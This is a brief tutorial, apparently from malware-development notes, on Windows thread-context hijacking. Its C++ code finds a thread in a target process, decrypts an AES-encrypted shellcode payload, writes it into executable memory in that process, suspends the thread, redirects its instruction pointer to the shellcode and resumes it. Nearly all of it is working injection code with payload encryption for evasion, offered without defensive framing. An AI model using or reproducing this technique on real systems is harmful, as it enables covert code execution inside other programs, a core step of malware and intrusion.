We can inject code to a remote process using `Thread Context`

1. First we find the thread on a remote process
2. Then we allocate our shellcode into the remote thread
3. Suspend the remote thread
4. Change the context of the remote thread (change instruction pointer) to execute next the shellcode
5. Finally we resume the thread

First we define the `FindThread` Function:
```cpp
HANDLE FindThread(int pid){
  
    HANDLE hThread = NULL;
    THREADENTRY32 thEntry;
  
    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    while (Thread32Next(Snap, &thEntry)) {
        if (thEntry.th32OwnerProcessID == pid)  {
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
            break;
        }
    }
    
    CloseHandle(Snap);
    return hThread;
}
```

Now we use it in `InjectCTX` function:
```cpp
int InjectCTX(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
  
    HANDLE hThread = NULL;
    LPVOID pRemoteCode = NULL;
    CONTEXT ctx;
  
    // find a thread in target process
    hThread = FindThread(pid);
    if (hThread == NULL) {
        printf("Error, hijack unsuccessful.\n");
        return -1;
    }
  
    // Decrypt payload
    AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
    // perform payload injection
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
  
    // execute the payload by hijacking a thread in target process
    SuspendThread(hThread);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
#ifdef _M_IX86
    ctx.Eip = (DWORD_PTR) pRemoteCode;
#else
    ctx.Rip = (DWORD_PTR) pRemoteCode;
#endif
    SetThreadContext(hThread, &ctx);
    return ResumeThread(hThread);  
}